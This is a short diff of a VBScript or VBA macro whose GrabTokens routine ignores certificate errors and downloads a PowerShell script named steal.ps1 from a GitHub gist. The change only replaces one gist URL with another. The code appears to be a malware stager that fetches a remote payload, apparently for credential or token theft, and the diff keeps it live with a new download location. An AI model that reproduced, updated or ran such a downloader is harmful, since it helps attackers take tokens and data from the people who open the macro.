@@ -91,7 +91,7 @@ End Sub
 Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/Lxg-cmd/5e01b179b04b043bd364cd613ed4b169/raw/a53d7e928e43b66d646109002f4326a792378ace/steal.ps1", False
+    xh.Open "GET", "https://gist.githubusercontent.com/Lxg-cmd/485ae68f0ee7e755635e513e6dace111/raw/13f84a20cc881bee6cf38c987fd3f98f937221e2/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
